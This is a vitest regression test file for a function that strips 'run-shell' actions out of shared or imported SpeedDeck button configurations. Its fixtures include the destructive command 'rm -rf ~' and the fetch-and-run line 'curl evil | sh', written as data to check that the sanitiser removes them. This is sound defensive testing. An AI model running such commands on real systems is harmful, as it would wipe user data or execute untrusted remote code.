import { describe, it, expect } from 'vitest'
import { stripRunShellFromDeck, stripRunShellFromDeckContent } from '@shared/streamdeck'
import type { DeckConfig } from '@shared/streamdeck'

// Regression for the confirmed critical: a shared/imported SpeedDeck could
// carry a run-shell command that ran on one click. Delivery must strip it
// (the executor also confirms at click time; this is defense in depth).

function deckWith(action: unknown): DeckConfig {
  return {
    _version: 1,
    rootPageId: 'root',
    pages: {
      root: {
        id: 'root',
        name: 'Root',
        buttons: {
          0: { id: 'b0', kind: 'action', label: 'Evil', style: {}, action: action as never },
          1: { id: 'b1', kind: 'action', label: 'Nice', style: {}, action: { type: 'open-url', url: 'https://x' } as never }
        }
      }
    },
    settings: { defaultSound: 'click', defaultHaptic: 'soft', glow: 0.5 }
  } as unknown as DeckConfig
}

describe('stripRunShellFromDeck', () => {
  it('neutralises a top-level run-shell action and leaves others intact', () => {
    const { config, strippedCount } = stripRunShellFromDeck(deckWith({ type: 'run-shell', command: 'rm -rf ~' }))
    expect(strippedCount).toBe(1)
    const b0 = config.pages.root.buttons[0]
    expect(b0 && b0.kind === 'action' && b0.action.type).not.toBe('run-shell')
    const b1 = config.pages.root.buttons[1]
    expect(b1 && b1.kind === 'action' && b1.action.type).toBe('open-url')
  })

  it('strips run-shell nested inside a multi-step action', () => {
    const { config, strippedCount } = stripRunShellFromDeck(
      deckWith({ type: 'multi-step', steps: [{ type: 'open-url', url: 'https://x' }, { type: 'run-shell', command: 'curl evil | sh' }] })
    )
    expect(strippedCount).toBe(1)
    const b0 = config.pages.root.buttons[0]
    const steps = b0 && b0.kind === 'action' && b0.action.type === 'multi-step' ? b0.action.steps : []
    expect(steps.some((s) => s.type === 'run-shell')).toBe(false)
  })

  it('serialised content round-trips through the content helper', () => {
    const raw = JSON.stringify(deckWith({ type: 'run-shell', command: 'evil' }))
    const cleaned = stripRunShellFromDeckContent(raw)
    expect(cleaned).not.toContain('run-shell')
    expect(cleaned).not.toContain('evil')
  })

  it('handles the { scope, taskDeck } wrapper the widget persists', () => {
    const wrapped = JSON.stringify({ scope: 'task', taskDeck: deckWith({ type: 'run-shell', command: 'evil' }) })
    const cleaned = stripRunShellFromDeckContent(wrapped)
    expect(cleaned).not.toContain('run-shell')
    expect(JSON.parse(cleaned).scope).toBe('task')
  })

  it('returns non-deck content unchanged', () => {
    expect(stripRunShellFromDeckContent('')).toBe('')
    expect(stripRunShellFromDeckContent('not json')).toBe('not json')
  })
})
